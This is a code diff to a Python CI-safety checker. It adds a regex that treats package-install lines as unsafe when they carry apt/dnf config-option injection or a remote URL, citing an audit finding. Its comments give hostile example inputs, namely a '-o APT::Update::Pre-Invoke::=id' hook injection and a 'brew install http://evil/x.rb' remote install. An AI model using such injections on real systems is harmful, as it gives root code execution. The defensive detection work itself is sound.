@@ -109,6 +109,22 @@ def _has_known_safe_ci_pattern(line: str) -> bool:
 # recognised-safe command, or any arbitrary-exec metacharacter appears
 # (``|`` ``;`` ``$(`` backtick ``>`` ``<``), we fall back to demote.
 _SHELL_EXEC_METACHARS_RE: Final[re.Pattern[str]] = re.compile(r"[|;<>`]|\$\(")
+
+# Tokens that turn a metachar-free pkg-install line into arbitrary code execution
+# WITHOUT any shell metacharacter, so the metachar guard above misses them
+# (audit MAJOR #4):
+#   * apt/dnf/yum config-option injection: ``-o APT::Update::Pre-Invoke::=id`` /
+#     ``--option DPkg::Pre-Invoke=…`` and ``-c``/``--config-file`` load an apt
+#     config that can carry the same Pre-Invoke hooks → root RCE.
+#   * a remote URL fed to a package manager (``brew install http://evil/x.rb``,
+#     ``dnf install http://…rpm``) executes arbitrary remote code. The ``://``
+#     scheme separator is the tell; a legit ``pkg:arch`` / ``pkg=version`` spec
+#     never contains it.
+# A line carrying any of these is NOT certifiable-airtight → fall back to demote.
+_DANGEROUS_INSTALL_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:^|\s)(?:-o|--option|-c|--config-file)\b" r"|://",
+    re.IGNORECASE,
+)
 _SAFE_RUN_SEGMENT_RE: Final[tuple[re.Pattern[str], ...]] = tuple(
     re.compile(p, re.IGNORECASE)
     for p in (
@@ -136,6 +152,10 @@ def _run_line_is_airtight_pkg_install(line: str) -> bool:
     if not body:
         return False
     if _SHELL_EXEC_METACHARS_RE.search(body):
+        return False
+    # Metachar-free but still arbitrary-exec: apt config-option injection
+    # (``-o …Pre-Invoke…``) or a remote-URL install (``://``). (audit MAJOR #4)
+    if _DANGEROUS_INSTALL_TOKEN_RE.search(body):
         return False
     # A lone ``&`` (background) is also unsafe; only ``&&`` chaining is ok.
     if re.search(r"(?<!&)&(?!&)", body):
